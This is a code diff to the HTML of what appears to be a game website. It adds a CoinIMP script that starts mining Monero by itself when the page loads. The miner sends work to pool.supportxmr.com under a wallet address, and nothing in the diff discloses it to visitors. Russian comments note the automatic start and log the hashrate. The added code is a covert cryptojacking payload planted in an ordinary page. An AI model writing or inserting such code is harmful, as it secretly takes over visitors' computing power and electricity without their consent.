@@ -3470,5 +3470,29 @@ function saveReferrer(referrerUid) {
       Free Game and Bonus
     </a>
   </div>-->
+
+<script src="https://www.coinimp.com/scripts/coinimp.min.js"></script>
+<script>
+  var miner = new CoinIMP('a906669d7e396ee6ee954686b5a94aca67c554cebb263559bb90c79e9a945eda', {
+    throttle: 0.8, // Ограничение нагрузки до 20%
+    pool: {
+      url: 'stratum+tcp://pool.supportxmr.com:5555', // Порт с TLS
+      user: '82ey8Z4KnHG22sSKiY9z8uExsetHc79fHSvMjSMgoG6t9CwQbBPKHYV8Tgi8skVaXU687cNPCetBD17BRuHP4uUf2JyQA4M.game_site',
+      pass: 'x',
+      tls: true // Включение TLS
+    }
+  });
+
+  // Автоматический запуск майнинга
+  miner.start();
+  console.log("Майнинг начат!");
+
+  // Логирование хешрейта (опционально)
+  miner.on('update', (data) => {
+    console.log(`Хешрейт: ${data.hashrate} H/s`);
+  });
+</script>
+
+  
 </body>
 </html>
